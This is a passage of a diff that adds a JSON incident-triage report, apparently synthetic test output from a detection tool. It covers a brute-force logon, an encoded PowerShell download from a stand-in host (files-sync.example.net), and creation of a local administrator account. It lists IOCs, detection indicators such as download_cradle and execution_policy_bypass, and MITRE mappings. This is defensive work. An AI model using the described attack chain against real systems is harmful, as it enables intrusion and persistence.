+        "target_sid": "S-1-5-21-1000000001-2000000002-3000000003-1004"
+      },
+      "description": "Account 'svc_helpdesk' was created on WIN-PC-01 at 2026-10-08T07:35:22Z by 'ahmed'. Privileged target: yes. Context indicators matched: process_chain_linked_to_powershell_finding, actor_account_targeted_by_bruteforce.",
+      "detected_at": "2026-10-26T09:40:16.556076Z",
+      "device": "WIN-PC-01",
+      "evidence_files": [
+        "events.json",
+        "powershell.json",
+        "processes.json",
+        "users.json"
+      ],
+      "evidence_sources": [
+        "EVL-0010",
+        "PROC-0004",
+        "PROC-0005",
+        "PROC-0006",
+        "PROC-0007",
+        "PS-0003",
+        "PROC-0008",
+        "EVL-0011",
+        "EVL-0012",
+        "USR-0006"
+      ],
+      "finding_id": "F-004",
+      "first_seen": "2026-10-08T07:32:40Z",
+      "iocs": [
+        "IOC-001",
+        "IOC-002",
+        "IOC-003",
+        "IOC-004",
+        "IOC-005",
+        "IOC-006",
+        "IOC-007",
+        "IOC-008",
+        "IOC-010"
+      ],
+      "last_seen": "2026-10-08T07:35:31Z",
+      "matched_indicators": [
+        {
+          "basis": "group_membership_event",
+          "description": "new account was added to a privileged group after creation",
+          "event_id": "E-00032",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0012",
+          "group": "Administrators",
+          "indicator": "privileged_target",
+          "seconds_after_creation": 9.0
+        },
+        {
+          "basis": "users_snapshot",
+          "description": "users.json lists the new account as an administrator",
+          "evidence_file": "users.json",
+          "evidence_id": "USR-0006",
+          "groups": [
+            "Administrators"
+          ],
+          "indicator": "privileged_target",
+          "is_admin": true
+        },
+        {
+          "description": "the process that created the account descends from a process in a PowerShell finding",
+          "finding_id": "F-002",
+          "indicator": "process_chain_linked_to_powershell_finding",
+          "link_basis": "ppid -> pid, same device, bounded time window",
+          "linked_process_event_ids": [
+            "E-00022"
+          ],
+          "linked_process_evidence_ids": [
+            "PROC-0006"
+          ],
+          "rule_id": "DET-002"
+        },
+        {
+          "description": "the process that created the account descends from a process in a PowerShell finding",
+          "finding_id": "F-003",
+          "indicator": "process_chain_linked_to_powershell_finding",
+          "link_basis": "ppid -> pid, same device, bounded time window",
+          "linked_process_event_ids": [
+            "E-00026"
+          ],
+          "linked_process_evidence_ids": [
+            "PROC-0007"
+          ],
+          "rule_id": "DET-002"
+        },
+        {
+          "description": "the acting account had a brute-force finding followed by a successful logon before the creation",
+          "finding_id": "F-001",
+          "indicator": "actor_account_targeted_by_bruteforce",
+          "link_strength": "account-level (no logon-session id is available)",
+          "rule_id": "DET-001",
+          "seconds_before_creation": 162.0,
+          "successful_logon_event_id": "E-00018"
+        }
+      ],
+      "mitre_techniques": [
+        "T1098.007",
+        "T1136.001"
+      ],
+      "reason": "Account creation by 'ahmed' of 'svc_helpdesk': privileged target = yes; 2 context indicator(s) matched (minimum 1): process_chain_linked_to_powershell_finding, actor_account_targeted_by_bruteforce.",
+      "recommended_next_steps": [
+        "Review the cited evidence records and confirm the activity with the system owner.",
+        "Preserve the original evidence package and its manifest before making changes.",
+        "Correlate the cited events with adjacent timeline activity before assigning incident impact.",
+        "Prioritize analyst review because the rule assigned a high severity; treat this as triage priority, not proof of compromise."
+      ],
+      "rule_id": "DET-003",
+      "rule_name": "Suspicious Account Creation",
+      "severity": "High",
+      "severity_factors": [
+        "base level for an account creation: Low",
+        "+1: the new account is privileged (group membership event and users snapshot)",
+        "+1: process_chain_linked_to_powershell_finding",
+        "+1: actor_account_targeted_by_bruteforce"
+      ],
+      "supporting_events": [
+        "E-00018",
+        "E-00019",
+        "E-00021",
+        "E-00022",
+        "E-00026",
+        "E-00027",
+        "E-00029",
+        "E-00030",
+        "E-00032"
+      ],
+      "title": "Suspicious Account Creation",
+      "user": "ahmed"
+    }
+  ],
+  "generated_at": "2026-10-26T09:40:16.556076Z",
+  "incident_id": "INC-001",
+  "iocs": [
+    {
+      "attributes": {
+        "external": false,
+        "ip_class": "documentation"
+      },
+      "context": "source address of a failed logon (RemoteInteractive) (+6 more occurrence(s))",
+      "evidence_id": "EVL-0004",
+      "first_seen": "2026-10-08T07:31:02Z",
+      "ioc_id": "IOC-001",
+      "last_seen": "2026-10-08T07:32:40Z",
+      "occurrences": [
+        {
+          "context": "source address of a failed logon (RemoteInteractive)",
+          "event_id": "E-00011",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0004",
+          "field": "source_ip",
+          "timestamp": "2026-10-08T07:31:02Z"
+        },
+        {
+          "context": "source address of a failed logon (RemoteInteractive)",
+          "event_id": "E-00012",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0005",
+          "field": "source_ip",
+          "timestamp": "2026-10-08T07:31:15Z"
+        },
+        {
+          "context": "source address of a failed logon (RemoteInteractive)",
+          "event_id": "E-00013",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0006",
+          "field": "source_ip",
+          "timestamp": "2026-10-08T07:31:28Z"
+        },
+        {
+          "context": "source address of a failed logon (RemoteInteractive)",
+          "event_id": "E-00014",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0007",
+          "field": "source_ip",
+          "timestamp": "2026-10-08T07:31:41Z"
+        },
+        {
+          "context": "source address of a failed logon (RemoteInteractive)",
+          "event_id": "E-00015",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0008",
+          "field": "source_ip",
+          "timestamp": "2026-10-08T07:31:55Z"
+        },
+        {
+          "context": "source address of a failed logon (RemoteInteractive)",
+          "event_id": "E-00016",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0009",
+          "field": "source_ip",
+          "timestamp": "2026-10-08T07:32:08Z"
+        },
+        {
+          "context": "source address of a successful logon (RemoteInteractive)",
+          "event_id": "E-00018",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0010",
+          "field": "source_ip",
+          "timestamp": "2026-10-08T07:32:40Z"
+        }
+      ],
+      "related_findings": [
+        "F-001",
+        "F-004"
+      ],
+      "source": "events.json",
+      "timestamp": "2026-10-08T07:31:02Z",
+      "type": "ip",
+      "value": "198.51.100.23"
+    },
+    {
+      "attributes": {
+        "roles": [
+          "account of a failed logon",
+          "account of a successful logon",
+          "account that changed a group membership",
+          "account that created an account",
+          "account that ran PowerShell",
+          "account that started a process"
+        ]
+      },
+      "context": "account of a failed logon (+15 more occurrence(s))",
+      "evidence_id": "EVL-0004",
+      "first_seen": "2026-10-08T07:31:02Z",
+      "ioc_id": "IOC-002",
+      "last_seen": "2026-10-08T07:35:31Z",
+      "occurrences": [
+        {
+          "context": "account of a failed logon",
+          "event_id": "E-00011",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0004",
+          "field": "user",
+          "timestamp": "2026-10-08T07:31:02Z"
+        },
+        {
+          "context": "account of a failed logon",
+          "event_id": "E-00012",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0005",
+          "field": "user",
+          "timestamp": "2026-10-08T07:31:15Z"
+        },
+        {
+          "context": "account of a failed logon",
+          "event_id": "E-00013",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0006",
+          "field": "user",
+          "timestamp": "2026-10-08T07:31:28Z"
+        },
+        {
+          "context": "account of a failed logon",
+          "event_id": "E-00014",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0007",
+          "field": "user",
+          "timestamp": "2026-10-08T07:31:41Z"
+        },
+        {
+          "context": "account of a failed logon",
+          "event_id": "E-00015",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0008",
+          "field": "user",
+          "timestamp": "2026-10-08T07:31:55Z"
+        },
+        {
+          "context": "account of a failed logon",
+          "event_id": "E-00016",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0009",
+          "field": "user",
+          "timestamp": "2026-10-08T07:32:08Z"
+        },
+        {
+          "context": "account of a successful logon",
+          "event_id": "E-00018",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0010",
+          "field": "user",
+          "timestamp": "2026-10-08T07:32:40Z"
+        },
+        {
+          "context": "account that started a process",
+          "event_id": "E-00019",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0004",
+          "field": "user",
+          "timestamp": "2026-10-08T07:32:58Z"
+        },
+        {
+          "context": "account that started a process",
+          "event_id": "E-00021",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0005",
+          "field": "user",
+          "timestamp": "2026-10-08T07:33:52Z"
+        },
+        {
+          "context": "account that started a process",
+          "event_id": "E-00022",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0006",
+          "field": "user",
+          "timestamp": "2026-10-08T07:34:01Z"
+        },
+        {
+          "context": "account that ran PowerShell",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "user",
+          "timestamp": "2026-10-08T07:34:02Z"
+        },
+        {
+          "context": "account that started a process",
+          "event_id": "E-00026",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0007",
+          "field": "user",
+          "timestamp": "2026-10-08T07:34:44Z"
+        },
+        {
+          "context": "account that ran PowerShell",
+          "event_id": "E-00027",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0003",
+          "field": "user",
+          "timestamp": "2026-10-08T07:34:45Z"
+        },
+        {
+          "context": "account that started a process",
+          "event_id": "E-00029",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0008",
+          "field": "user",
+          "timestamp": "2026-10-08T07:35:20Z"
+        },
+        {
+          "context": "account that created an account",
+          "event_id": "E-00030",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0011",
+          "field": "user",
+          "timestamp": "2026-10-08T07:35:22Z"
+        },
+        {
+          "context": "account that changed a group membership",
+          "event_id": "E-00032",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0012",
+          "field": "user",
+          "timestamp": "2026-10-08T07:35:31Z"
+        }
+      ],
+      "related_findings": [
+        "F-001",
+        "F-002",
+        "F-003",
+        "F-004"
+      ],
+      "source": "events.json",
+      "timestamp": "2026-10-08T07:31:02Z",
+      "type": "username",
+      "value": "ahmed"
+    },
+    {
+      "attributes": {
+        "algorithm": "sha256",
+        "file_paths": [
+          "C:\\Users\\ahmed\\Downloads\\invoice_update.vbs"
+        ]
+      },
+      "context": "hash of the file invoice_update.vbs",
+      "evidence_id": "FILE-0002",
+      "first_seen": "2026-10-08T07:33:30Z",
+      "ioc_id": "IOC-003",
+      "last_seen": "2026-10-08T07:33:30Z",
+      "occurrences": [
+        {
+          "context": "hash of the file invoice_update.vbs",
+          "event_id": "E-00020",
+          "evidence_file": "files.json",
+          "evidence_id": "FILE-0002",
+          "field": "sha256",
+          "timestamp": "2026-10-08T07:33:30Z"
+        }
+      ],
+      "related_findings": [
+        "F-004"
+      ],
+      "source": "files.json",
+      "timestamp": "2026-10-08T07:33:30Z",
+      "type": "hash",
+      "value": "c8e2fe830a159ef1e219bde803ea689837bce62d5224f90c5531d0d9ae2c2535"
+    },
+    {
+      "attributes": {
+        "extension": "vbs",
+        "paths": [
+          "C:\\Users\\ahmed\\Downloads\\invoice_update.vbs"
+        ]
+      },
+      "context": "file record at a path found in finding evidence (+1 more occurrence(s))",
+      "evidence_id": "FILE-0002",
+      "first_seen": "2026-10-08T07:33:30Z",
+      "ioc_id": "IOC-004",
+      "last_seen": "2026-10-08T07:33:52Z",
+      "occurrences": [
+        {
+          "context": "file record at a path found in finding evidence",
+          "event_id": "E-00020",
+          "evidence_file": "files.json",
+          "evidence_id": "FILE-0002",
+          "field": "path",
+          "path": "C:\\Users\\ahmed\\Downloads\\invoice_update.vbs",
+          "timestamp": "2026-10-08T07:33:30Z"
+        },
+        {
+          "context": "file path found in command_line",
+          "event_id": "E-00021",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0005",
+          "field": "command_line",
+          "path": "C:\\Users\\ahmed\\Downloads\\invoice_update.vbs",
+          "timestamp": "2026-10-08T07:33:52Z"
+        }
+      ],
+      "related_findings": [
+        "F-004"
+      ],
+      "source": "files.json",
+      "timestamp": "2026-10-08T07:33:30Z",
+      "type": "filename",
+      "value": "invoice_update.vbs"
+    },
+    {
+      "attributes": {
+        "reserved_for_documentation": true
+      },
+      "context": "host of a URL found in command_line (decoded) (+4 more occurrence(s))",
+      "evidence_id": "PROC-0006",
+      "first_seen": "2026-10-08T07:34:01Z",
+      "ioc_id": "IOC-005",
+      "last_seen": "2026-10-08T07:34:50Z",
+      "occurrences": [
+        {
+          "context": "host of a URL found in command_line (decoded)",
+          "event_id": "E-00022",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0006",
+          "field": "command_line (decoded)",
+          "timestamp": "2026-10-08T07:34:01Z"
+        },
+        {
+          "context": "host of a URL found in command",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "command",
+          "timestamp": "2026-10-08T07:34:02Z"
+        },
+        {
+          "context": "host of a URL found in host_application (decoded)",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "host_application (decoded)",
+          "timestamp": "2026-10-08T07:34:02Z"
+        },
+        {
+          "context": "remote host name of a connection by powershell.exe",
+          "event_id": "E-00025",
+          "evidence_file": "network.json",
+          "evidence_id": "NET-0004",
+          "field": "remote_hostname",
+          "timestamp": "2026-10-08T07:34:12Z"
+        },
+        {
+          "context": "remote host name of a connection by powershell.exe",
+          "event_id": "E-00028",
+          "evidence_file": "network.json",
+          "evidence_id": "NET-0005",
+          "field": "remote_hostname",
+          "timestamp": "2026-10-08T07:34:50Z"
+        }
+      ],
+      "related_findings": [
+        "F-002",
+        "F-003",
+        "F-004"
+      ],
+      "source": "processes.json",
+      "timestamp": "2026-10-08T07:34:01Z",
+      "type": "domain",
+      "value": "files-sync.example.net"
+    },
+    {
+      "attributes": {
+        "credentials_removed": false,
+        "host": "files-sync.example.net",
+        "host_type": "domain",
+        "scheme": "https"
+      },
+      "context": "URL found in command_line (decoded) (+2 more occurrence(s))",
+      "evidence_id": "PROC-0006",
+      "first_seen": "2026-10-08T07:34:01Z",
+      "ioc_id": "IOC-006",
+      "last_seen": "2026-10-08T07:34:02Z",
+      "occurrences": [
+        {
+          "context": "URL found in command_line (decoded)",
+          "event_id": "E-00022",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0006",
+          "field": "command_line (decoded)",
+          "timestamp": "2026-10-08T07:34:01Z"
+        },
+        {
+          "context": "URL found in command",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "command",
+          "timestamp": "2026-10-08T07:34:02Z"
+        },
+        {
+          "context": "URL found in host_application (decoded)",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "host_application (decoded)",
+          "timestamp": "2026-10-08T07:34:02Z"
+        }
+      ],
+      "related_findings": [
+        "F-002",
+        "F-004"
+      ],
+      "source": "processes.json",
+      "timestamp": "2026-10-08T07:34:01Z",
+      "type": "url",
+      "value": "https://files-sync.example.net/stage/update_svc.ps1"
+    },
+    {
+      "attributes": {
+        "extension": "ps1",
+        "paths": [
+          "C:\\Users\\Public\\update_svc.ps1"
+        ]
+      },
+      "context": "file path found in command_line (decoded) (+6 more occurrence(s))",
+      "evidence_id": "PROC-0006",
+      "first_seen": "2026-10-08T07:34:01Z",
+      "ioc_id": "IOC-007",
+      "last_seen": "2026-10-08T07:34:45Z",
+      "occurrences": [
+        {
+          "context": "file path found in command_line (decoded)",
+          "event_id": "E-00022",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0006",
+          "field": "command_line (decoded)",
+          "path": "C:\\Users\\Public\\update_svc.ps1",
+          "timestamp": "2026-10-08T07:34:01Z"
+        },
+        {
+          "context": "file path found in command",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "command",
+          "path": "C:\\Users\\Public\\update_svc.ps1",
+          "timestamp": "2026-10-08T07:34:02Z"
+        },
+        {
+          "context": "file path found in host_application (decoded)",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "host_application (decoded)",
+          "path": "C:\\Users\\Public\\update_svc.ps1",
+          "timestamp": "2026-10-08T07:34:02Z"
+        },
+        {
+          "context": "file record at a path found in finding evidence",
+          "event_id": "E-00024",
+          "evidence_file": "files.json",
+          "evidence_id": "FILE-0003",
+          "field": "path",
+          "path": "C:\\Users\\Public\\update_svc.ps1",
+          "timestamp": "2026-10-08T07:34:09Z"
+        },
+        {
+          "context": "file path found in command_line",
+          "event_id": "E-00026",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0007",
+          "field": "command_line",
+          "path": "C:\\Users\\Public\\update_svc.ps1",
+          "timestamp": "2026-10-08T07:34:44Z"
+        },
+        {
+          "context": "file path found in host_application",
+          "event_id": "E-00027",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0003",
+          "field": "host_application",
+          "path": "C:\\Users\\Public\\update_svc.ps1",
+          "timestamp": "2026-10-08T07:34:45Z"
+        },
+        {
+          "context": "script path of a PowerShell record",
+          "event_id": "E-00027",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0003",
+          "field": "script_path",
+          "path": "C:\\Users\\Public\\update_svc.ps1",
+          "timestamp": "2026-10-08T07:34:45Z"
+        }
+      ],
+      "related_findings": [
+        "F-002",
+        "F-003",
+        "F-004"
+      ],
+      "source": "processes.json",
+      "timestamp": "2026-10-08T07:34:01Z",
+      "type": "filename",
+      "value": "update_svc.ps1"
+    },
+    {
+      "attributes": {
+        "algorithm": "sha256",
+        "file_paths": [
+          "C:\\Users\\Public\\update_svc.ps1"
+        ]
+      },
+      "context": "hash of the file update_svc.ps1",
+      "evidence_id": "FILE-0003",
+      "first_seen": "2026-10-08T07:34:09Z",
+      "ioc_id": "IOC-008",
+      "last_seen": "2026-10-08T07:34:09Z",
+      "occurrences": [
+        {
+          "context": "hash of the file update_svc.ps1",
+          "event_id": "E-00024",
+          "evidence_file": "files.json",
+          "evidence_id": "FILE-0003",
+          "field": "sha256",
+          "timestamp": "2026-10-08T07:34:09Z"
+        }
+      ],
+      "related_findings": [
+        "F-002",
+        "F-003",
+        "F-004"
+      ],
+      "source": "files.json",
+      "timestamp": "2026-10-08T07:34:09Z",
+      "type": "hash",
+      "value": "dc2b08f6eff0cd3255c996ab6f9ff4f922504bc447eb252cfb03c9e451649a84"
+    },
+    {
+      "attributes": {
+        "external": false,
+        "ip_class": "documentation"
+      },
+      "context": "remote address of an outbound connection by powershell.exe (+1 more occurrence(s))",
+      "evidence_id": "NET-0004",
+      "first_seen": "2026-10-08T07:34:12Z",
+      "ioc_id": "IOC-009",
+      "last_seen": "2026-10-08T07:34:50Z",
+      "occurrences": [
+        {
+          "context": "remote address of an outbound connection by powershell.exe",
+          "direction": "outbound",
+          "event_id": "E-00025",
+          "evidence_file": "network.json",
+          "evidence_id": "NET-0004",
+          "field": "remote_address",
+          "port": 443,
+          "timestamp": "2026-10-08T07:34:12Z"
+        },
+        {
+          "context": "remote address of an outbound connection by powershell.exe",
+          "direction": "outbound",
+          "event_id": "E-00028",
+          "evidence_file": "network.json",
+          "evidence_id": "NET-0005",
+          "field": "remote_address",
+          "port": 8443,
+          "timestamp": "2026-10-08T07:34:50Z"
+        }
+      ],
+      "related_findings": [
+        "F-002",
+        "F-003"
+      ],
+      "source": "network.json",
+      "timestamp": "2026-10-08T07:34:12Z",
+      "type": "ip",
+      "value": "203.0.113.77"
+    },
+    {
+      "attributes": {
+        "roles": [
+          "account added to group 'Administrators'",
+          "account that was created"
+        ]
+      },
+      "context": "account that was created (+1 more occurrence(s))",
+      "evidence_id": "EVL-0011",
+      "first_seen": "2026-10-08T07:35:22Z",
+      "ioc_id": "IOC-010",
+      "last_seen": "2026-10-08T07:35:31Z",
+      "occurrences": [
+        {
+          "context": "account that was created",
+          "event_id": "E-00030",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0011",
+          "field": "target_user",
+          "timestamp": "2026-10-08T07:35:22Z"
+        },
+        {
+          "context": "account added to group 'Administrators'",
+          "event_id": "E-00032",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0012",
+          "field": "member_name",
+          "timestamp": "2026-10-08T07:35:31Z"
+        }
+      ],
+      "related_findings": [
+        "F-004"
+      ],
+      "source": "events.json",
+      "timestamp": "2026-10-08T07:35:22Z",
+      "type": "username",
+      "value": "svc_helpdesk"
+    }
+  ],
+  "mitre_mappings": [
+    {
+      "attack_version": "19.2",
+      "confidence": "High",
+      "confidence_factors": [
+        "base level for this mapping: Medium",
+        "raised to High: both a process record and PowerShell script-block records show the execution",
+        "also supported by F-003; the best confidence among the supporting findings is reported"
+      ],
+      "evidence_sources": [
+        "PROC-0006",
+        "PROC-0007",
+        "PS-0002",
+        "PS-0003"
+      ],
+      "ioc_ids": [
+        "IOC-007"
+      ],
+      "is_subtechnique": true,
+      "mapping_id": "MAP-T1059.001-TA0002",
+      "parent_technique_id": "T1059",
+      "parent_technique_name": "Command and Scripting Interpreter",
+      "reason": "PowerShell execution is recorded for PID 6012 on WIN-PC-01 (user ahmed); the finding matched download_cradle, encoded_command, execution_policy_bypass, hidden_window, unusual_parent, user_writable_script_path. Consistent with PowerShell used for execution. (Shown for F-002; also supported by F-003, see sources.)",
+      "related_finding": "F-002",
+      "related_findings": [
+        "F-002",
+        "F-003"
+      ],
+      "sources": [
+        {
+          "confidence": "High",
+          "confidence_factors": [
+            "base level for this mapping: Medium",
+            "raised to High: both a process record and PowerShell script-block records show the execution"
+          ],
+          "evidence_sources": [
+            "PROC-0006",
+            "PS-0002"
+          ],
+          "finding_id": "F-002",
+          "ioc_ids": [
+            "IOC-007"
+          ],
+          "mapping_rule_id": "DET002-T1059.001",
+          "rationale": "PowerShell execution is recorded for PID 6012 on WIN-PC-01 (user ahmed); the finding matched download_cradle, encoded_command, execution_policy_bypass, hidden_window, unusual_parent, user_writable_script_path. Consistent with PowerShell used for execution.",
+          "rule_id": "DET-002",
+          "supporting_events": [
+            "E-00022",
+            "E-00023"
+          ]
+        },
+        {
+          "confidence": "Medium",
+          "confidence_factors": [
+            "base level for this mapping: Medium",
+            "raised to High: both a process record and PowerShell script-block records show the execution",
+            "capped at the finding's confidence (Medium)"
+          ],
+          "evidence_sources": [
+            "PROC-0007",
+            "PS-0003"
+          ],
+          "finding_id": "F-003",
+          "ioc_ids": [
+            "IOC-007"
+          ],
+          "mapping_rule_id": "DET002-T1059.001",
+          "rationale": "PowerShell execution is recorded for PID 6188 on WIN-PC-01 (user ahmed); the finding matched execution_policy_bypass, user_writable_script_path. Consistent with PowerShell used for execution.",
+          "rule_id": "DET-002",
+          "supporting_events": [
+            "E-00026",
+            "E-00027"
+          ]
+        }
+      ],
+      "subtechnique_id": "T1059.001",
+      "subtechnique_name": "PowerShell",
+      "supporting_events": [
+        "E-00022",
+        "E-00023",
+        "E-00026",
+        "E-00027"
+      ],
+      "tactic": "Execution",
+      "tactic_id": "TA0002",
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution"
+        }
+      ],
+      "technique_id": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: PowerShell"
+    },
+    {
+      "attack_version": "19.2",
+      "confidence": "High",
+      "confidence_factors": [
+        "base level for this mapping: Medium",
+        "raised to High: a process or script record shows the creation command naming the new account"
+      ],
+      "evidence_sources": [
+        "EVL-0011",
+        "PROC-0008",
+        "PS-0003"
+      ],
+      "ioc_ids": [
+        "IOC-010"
+      ],
+      "is_subtechnique": true,
+      "mapping_id": "MAP-T1136.001-TA0003",
+      "parent_technique_id": "T1136",
+      "parent_technique_name": "Create Account",
+      "reason": "Event 4720 shows 'ahmed' created account 'svc_helpdesk' on WIN-PC-01; the account's domain (WIN-PC-01) equals the device name, so it is a local account, and surrounding activity matched (process_chain_linked_to_powershell_finding, actor_account_targeted_by_bruteforce). Consistent with creating a local account.",
+      "related_finding": "F-004",
+      "related_findings": [
+        "F-004"
+      ],
+      "sources": [
+        {
+          "confidence": "High",
+          "confidence_factors": [
+            "base level for this mapping: Medium",
+            "raised to High: a process or script record shows the creation command naming the new account"
+          ],
+          "evidence_sources": [
+            "EVL-0011",
+            "PROC-0008",
+            "PS-0003"
+          ],
+          "finding_id": "F-004",
+          "ioc_ids": [
+            "IOC-010"
+          ],
+          "mapping_rule_id": "DET003-T1136.001",
+          "rationale": "Event 4720 shows 'ahmed' created account 'svc_helpdesk' on WIN-PC-01; the account's domain (WIN-PC-01) equals the device name, so it is a local account, and surrounding activity matched (process_chain_linked_to_powershell_finding, actor_account_targeted_by_bruteforce). Consistent with creating a local account.",
+          "rule_id": "DET-003",
+          "supporting_events": [
+            "E-00027",
+            "E-00029",
+            "E-00030"
+          ]
+        }
+      ],
+      "subtechnique_id": "T1136.001",
+      "subtechnique_name": "Local Account",
+      "supporting_events": [
+        "E-00027",
+        "E-00029",
+        "E-00030"
+      ],
+      "tactic": "Persistence",
+      "tactic_id": "TA0003",
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence"
+        }
+      ],
+      "technique_id": "T1136.001",
+      "technique_name": "Create Account: Local Account"
+    },
+    {
+      "attack_version": "19.2",
+      "confidence": "High",
+      "confidence_factors": [
+        "base level for this mapping: Medium",
+        "raised to High: the users.json snapshot independently lists the account as an administrator"
+      ],
+      "evidence_sources": [
+        "EVL-0012"
+      ],
+      "ioc_ids": [
+        "IOC-010"
+      ],
+      "is_subtechnique": true,
+      "mapping_id": "MAP-T1098.007-TA0004",
+      "parent_technique_id": "T1098",
+      "parent_technique_name": "Account Manipulation",
+      "reason": "Event 4732 shows account 'svc_helpdesk' added to a privileged group after it was created by 'ahmed', with surrounding activity (process_chain_linked_to_powershell_finding, actor_account_targeted_by_bruteforce). Consistent with adding an account to additional local groups.",
+      "related_finding": "F-004",
+      "related_findings": [
+        "F-004"
+      ],
+      "sources": [
+        {
+          "confidence": "High",
+          "confidence_factors": [
+            "base level for this mapping: Medium",
+            "raised to High: the users.json snapshot independently lists the account as an administrator"
+          ],
+          "evidence_sources": [
+            "EVL-0012"
+          ],
+          "finding_id": "F-004",
+          "ioc_ids": [
+            "IOC-010"
+          ],
+          "mapping_rule_id": "DET003-T1098.007",
+          "rationale": "Event 4732 shows account 'svc_helpdesk' added to a privileged group after it was created by 'ahmed', with surrounding activity (process_chain_linked_to_powershell_finding, actor_account_targeted_by_bruteforce). Consistent with adding an account to additional local groups.",
+          "rule_id": "DET-003",
+          "supporting_events": [
+            "E-00032"
+          ]
+        }
+      ],
+      "subtechnique_id": "T1098.007",
+      "subtechnique_name": "Additional Local or Domain Groups",
+      "supporting_events": [
+        "E-00032"
+      ],
+      "tactic": "Privilege Escalation",
+      "tactic_id": "TA0004",
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation"
+        }
+      ],
+      "technique_id": "T1098.007",
+      "technique_name": "Account Manipulation: Additional Local or Domain Groups"
+    },
+    {
+      "attack_version": "19.2",
+      "confidence": "High",
+      "confidence_factors": [
+        "base level for this mapping: Medium",
+        "raised to High: the decoded command text itself matched further indicators"
+      ],
+      "evidence_sources": [
+        "PROC-0006",
+        "PS-0002"
+      ],
+      "ioc_ids": [],
+      "is_subtechnique": true,
+      "mapping_id": "MAP-T1027.010-TA0005",
+      "parent_technique_id": "T1027",
+      "parent_technique_name": "Obfuscated Files or Information",
+      "reason": "The PowerShell command line for PID 6012 carries a Base64 -EncodedCommand argument; ATT&CK lists Base64-encoded commands under command obfuscation. Consistent with an obfuscated command (finding matched download_cradle, encoded_command, execution_policy_bypass, hidden_window, unusual_parent, user_writable_script_path).",
+      "related_finding": "F-002",
+      "related_findings": [
+        "F-002"
+      ],
+      "sources": [
+        {
+          "confidence": "High",
+          "confidence_factors": [
+            "base level for this mapping: Medium",
+            "raised to High: the decoded command text itself matched further indicators"
+          ],
+          "evidence_sources": [
+            "PROC-0006",
+            "PS-0002"
+          ],
+          "finding_id": "F-002",
+          "ioc_ids": [],
+          "mapping_rule_id": "DET002-T1027.010",
+          "rationale": "The PowerShell command line for PID 6012 carries a Base64 -EncodedCommand argument; ATT&CK lists Base64-encoded commands under command obfuscation. Consistent with an obfuscated command (finding matched download_cradle, encoded_command, execution_policy_bypass, hidden_window, unusual_parent, user_writable_script_path).",
+          "rule_id": "DET-002",
+          "supporting_events": [
+            "E-00022",
+            "E-00023"
+          ]
+        }
+      ],
+      "subtechnique_id": "T1027.010",
+      "subtechnique_name": "Command Obfuscation",
+      "supporting_events": [
+        "E-00022",
+        "E-00023"
+      ],
+      "tactic": "Stealth",
+      "tactic_id": "TA0005",
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth"
+        }
+      ],
+      "technique_id": "T1027.010",
+      "technique_name": "Obfuscated Files or Information: Command Obfuscation"
+    },
+    {
+      "attack_version": "19.2",
+      "confidence": "Medium",
+      "confidence_factors": [
+        "base level for this mapping: Medium",
+        "not raised: it is not the case that the failure count is at least twice the detection threshold"
+      ],
+      "evidence_sources": [
+        "EVL-0004",
+        "EVL-0005",
+        "EVL-0006",
+        "EVL-0007",
+        "EVL-0008",
+        "EVL-0009"
+      ],
+      "ioc_ids": [
+        "IOC-001",
+        "IOC-002"
+      ],
+      "is_subtechnique": true,
+      "mapping_id": "MAP-T1110.001-TA0006",
+      "parent_technique_id": "T1110",
+      "parent_technique_name": "Brute Force",
+      "reason": "6 failed logons for account 'ahmed' from 198.51.100.23 within 120 s (threshold 5); the recorded failure reasons (wrong password=6) are wrong-password failures, which is consistent with password guessing against one account.",
+      "related_finding": "F-001",
+      "related_findings": [
+        "F-001"
+      ],
+      "sources": [
+        {
